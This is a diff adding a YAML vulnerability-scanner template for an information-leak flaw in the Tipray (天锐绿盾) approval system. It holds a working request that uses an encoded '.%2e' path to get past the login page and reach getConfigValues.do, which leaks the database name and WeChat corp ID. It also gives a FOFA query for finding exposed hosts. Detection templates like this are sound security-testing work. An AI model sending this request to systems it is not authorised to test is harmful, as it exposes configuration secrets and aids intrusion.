@@ -1,0 +1,16 @@
+id: poc-yaml-tipray-gsas-getconfigvalues-do-info-leak
+info:
+  name: 天锐绿盾审批系统 getConfigValues.do 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 天锐绿盾审批系统
+  fofa: app="TIPPAY-绿盾审批系统"
+requests:
+- method: POST
+  path: /trwfe/login.jsp/.%2e/config/getConfigValues.do
+  expression: status_code == 200 && contains(body,"\"ld.apply.reason.appoint\":")
+    && contains(body,"\"wx.corpid\":") && contains(body,"\"db.name\":") && contains(body,"com.tipray.mobileplatform")
+    && !contains(body,"<")
+variables: {}
+transport: http
